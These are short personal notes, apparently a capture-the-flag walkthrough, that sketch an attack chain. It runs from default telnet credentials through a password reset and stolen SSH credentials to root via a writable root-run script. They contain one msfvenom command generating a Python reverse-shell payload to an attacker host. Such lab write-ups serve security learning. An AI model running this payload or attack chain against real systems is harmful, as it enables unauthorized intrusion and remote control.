Points:
- telnet

secret port => vuln service => find exploit => but need user login to trigger
telnet serivce with default user pass => reset users's pass => telnet another service to read email => get ssh credential, but restricted; and the exploit doesn't work
replace the payload in the exploit with the one generated from msfvenom:
`
msfvenom -p cmd/unix/reverse_python LHOST=xxxx LPORT=xxx SHELL=/bin/bash -v payload -a cmd --platform Unix
`
=> get the normal shell

then pay attention to the enumeration script output, there is a writable script running by root.
